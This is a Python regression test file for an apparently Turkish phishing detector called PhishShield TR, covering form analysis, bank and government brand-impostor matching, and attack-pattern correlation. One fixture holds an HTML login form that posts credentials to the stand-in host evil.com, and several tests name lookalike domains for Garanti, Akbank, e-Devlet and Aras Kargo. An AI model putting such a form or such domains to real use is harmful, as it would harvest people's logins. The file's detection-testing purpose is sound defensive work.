"""
PhishShield TR - Sprint 5 Regression Tests
Tests Signal Engine V2, Form Analyzer, Brand Matcher, and Correlation Engine
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from analysis.form_analyzer import form_analyzer
from intelligence.brand_matcher import brand_matcher
from detection.correlation_v2 import correlation_engine_v2, AttackPattern


def test_form_analyzer_external_submit():
    """Test: Form with external submit should be detected"""
    print("Test: Form analyzer - external submit detection...")
    
    html = '''
    <form action="https://evil.com/submit" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
    </form>
    '''
    
    result = form_analyzer.analyze(html, 'https://garanti-fake.xyz')
    assert result.has_external_submit == True, "Should detect external submit"
    assert result.external_domain == 'evil.com', f"Should be evil.com, got {result.external_domain}"
    assert result.risk_score >= 40, f"Risk should be >= 40, got {result.risk_score}"
    
    print("  PASSED")


def test_form_analyzer_internal_submit():
    """Test: Form with internal submit should NOT be flagged as external"""
    print("Test: Form analyzer - internal submit...")
    
    html = '''
    <form action="/login" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
    </form>
    '''
    
    result = form_analyzer.analyze(html, 'https://legit-site.com')
    assert result.has_external_submit == False, "Internal submit should not be flagged"
    
    print("  PASSED")


def test_form_analyzer_hidden_fields():
    """Test: Hidden form fields should be detected"""
    print("Test: Form analyzer - hidden fields...")
    
    html = '''
    <form action="/submit" method="POST">
        <input type="hidden" name="csrf_token" value="abc123">
        <input type="text" name="username">
        <input type="password" name="password">
    </form>
    '''
    
    result = form_analyzer.analyze(html, 'https://test.com')
    assert 'hidden_field' in result.signals, "Should detect hidden field"
    
    print("  PASSED")


def test_brand_matcher_bank_impostor():
    """Test: Bank brand impostor should be detected"""
    print("Test: Brand matcher - bank impostor...")
    
    result = brand_matcher.analyze_domain('garanti-login-secure.xyz')
    assert result.is_impostor == True, "Should detect impostor"
    assert result.brand_name == 'Garanti BBVA', f"Should be Garanti, got {result.brand_name}"
    assert result.brand_category == 'BANKING', "Category should be BANKING"
    
    print("  PASSED")


def test_brand_matcher_official_domain():
    """Test: Official domain should NOT be flagged"""
    print("Test: Brand matcher - official domain...")
    
    result = brand_matcher.analyze_domain('garanti.com.tr')
    assert result.is_impostor == False, "Official domain should not be impostor"
    
    print("  PASSED")


def test_brand_matcher_akbank():
    """Test: Akbank impostor detection"""
    print("Test: Brand matcher - Akbank...")
    
    result = brand_matcher.analyze_domain('akbank-security.com')
    assert result.is_impostor == True, "Should detect Akbank impostor"
    assert result.brand_name == 'Akbank', f"Should be Akbank, got {result.brand_name}"
    
    print("  PASSED")


def test_brand_matcher_gov():
    """Test: Government brand impostor detection"""
    print("Test: Brand matcher - government brand...")
    
    result = brand_matcher.analyze_domain('edevlet-login.xyz')
    assert result.is_impostor == True, "Should detect e-Devlet impostor"
    assert result.brand_category == 'GOVERNMENT', "Category should be GOVERNMENT"
    
    print("  PASSED")


def test_correlation_bank_phishing():
    """Test: Bank phishing pattern correlation"""
    print("Test: Correlation - bank phishing pattern...")
    
    signals = ['bank_brand_match', 'password_field', 'external_submit', 'new_domain']
    result = correlation_engine_v2.correlate(signals)
    
    assert result.primary_pattern == AttackPattern.BANK_PHISHING, f"Should be BANK_PHISHING, got {result.primary_pattern}"
    assert result.pattern_score >= 80, f"Score should be >= 80, got {result.pattern_score}"
    assert result.threat_level == 'CRITICAL', "Threat level should be CRITICAL"
    
    print("  PASSED")


def test_correlation_credential_harvest():
    """Test: Credential harvesting pattern correlation"""
    print("Test: Correlation - credential harvest pattern...")
    
    signals = ['credential_harvesting_external', 'password_field', 'hidden_form_fields']
    result = correlation_engine_v2.correlate(signals)
    
    assert result.primary_pattern == AttackPattern.CREDENTIAL_HARVEST, f"Should be CREDENTIAL_HARVEST, got {result.primary_pattern}"
    assert result.pattern_score >= 80, f"Score should be >= 80, got {result.pattern_score}"
    
    print("  PASSED")


def test_correlation_no_pattern():
    """Test: No specific pattern with generic signals"""
    print("Test: Correlation - no pattern...")
    
    signals = ['suspicious_tld', 'contact_phone', 'english_content']
    result = correlation_engine_v2.correlate(signals)
    
    assert result.primary_pattern == AttackPattern.UNKNOWN, "Should be UNKNOWN"
    assert result.pattern_score < 50, f"Score should be low for generic signals, got {result.pattern_score}"
    
    print("  PASSED")


def test_correlation_cargo_scam():
    """Test: Cargo scam pattern correlation"""
    print("Test: Correlation - cargo scam pattern...")
    
    signals = ['cargo_brand_match', 'payment_fields', 'external_submit']
    result = correlation_engine_v2.correlate(signals)
    
    assert result.primary_pattern == AttackPattern.CARGO_SCAM, f"Should be CARGO_SCAM, got {result.primary_pattern}"
    
    print("  PASSED")


def test_form_analyzer_login_form():
    """Test: Login form detection"""
    print("Test: Form analyzer - login form...")
    
    html = '''
    <form>
        <input type="text" name="username">
        <input type="password" name="password">
    </form>
    '''
    
    result = form_analyzer.analyze(html, 'https://test.com')
    assert result.has_login_form == True, "Should detect login form"
    assert result.has_password_field == True, "Should detect password field"
    
    print("  PASSED")


def test_brand_matcher_cargo():
    """Test: Cargo brand detection"""
    print("Test: Brand matcher - cargo brand...")
    
    result = brand_matcher.analyze_domain('aras-kargo-secure.xyz')
    assert result.is_impostor == True, "Should detect cargo impostor"
    assert result.brand_category == 'CARGO', "Category should be CARGO"
    
    print("  PASSED")


def run_all_tests():
    """Run all regression tests"""
    print("=" * 60)
    print("Sprint 5 Regression Tests")
    print("=" * 60)
    print()
    
    tests = [
        test_form_analyzer_external_submit,
        test_form_analyzer_internal_submit,
        test_form_analyzer_hidden_fields,
        test_brand_matcher_bank_impostor,
        test_brand_matcher_official_domain,
        test_brand_matcher_akbank,
        test_brand_matcher_gov,
        test_correlation_bank_phishing,
        test_correlation_credential_harvest,
        test_correlation_no_pattern,
        test_correlation_cargo_scam,
        test_form_analyzer_login_form,
        test_brand_matcher_cargo,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"  FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"  ERROR: {e}")
            failed += 1
    
    print()
    print("=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
